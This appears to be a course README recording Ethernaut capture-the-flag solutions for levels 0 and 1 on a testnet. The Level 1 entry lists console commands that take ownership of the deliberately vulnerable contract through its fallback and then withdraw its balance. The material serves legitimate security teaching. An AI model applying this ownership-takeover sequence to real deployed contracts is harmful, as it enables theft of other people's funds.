# Ethernaut Capture the Flag (CTF)
The Ethernaut is a Web3/Solidity based wargame inspired by overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players.

# Assignments

## Submission
Please create a pull request with:
- The instance address of the contract you submitted
- Your wallet address
- The testnet you are using

## Ethernaut Level 0
 https://ethernaut.openzeppelin.com
 
##Solution
Try to understand the contract object, its functions and call the appropriate functions based on the contract ABI
Network: Polygon Mumbai
Instance: 0xC19F79Df2Fac6e2B44E7C13B0e2802EDA28b1Cf5
Tx: https://mumbai.polygonscan.com/tx/0xea9c8a26883de9737fa5d6c7974c70b890b793cfab02c6908f07ae220d3aebaa
 

## Ethernaut Level 1
https://ethernaut.openzeppelin.com

## Solution
Network: Polygon Mumbai
Instance: 0xda57daF1c08A0535E6ef5D60105ECeC369a4580A
Tx: https://mumbai.polygonscan.com/tx/0xe30925346ea5bde1a0bd5c1ff769dc26fb07a591194b9fc8c00de6a3339f5821
Steps: 

> await contract.owner()
0x2a24869323C0B13Dff24E196Ba072dC790D52479

> let bal = await contract.contributions('0x2a24869323C0B13Dff24E196Ba072dC790D52479')
> bal.toString()
'1000000000000000000000'

> await contract.contribute({value: toWei("0.00000000001","ether")})

> await contract.sendTransaction({value: toWei("0.00001","ether")})

> await contract.owner()
'0xdbaE4296E3Dd9d3f31a71BA7afa1735D0BaF92F6'

> player
'0xdbaE4296E3Dd9d3f31a71BA7afa1735D0BaF92F6'

> await contract.withdraw()

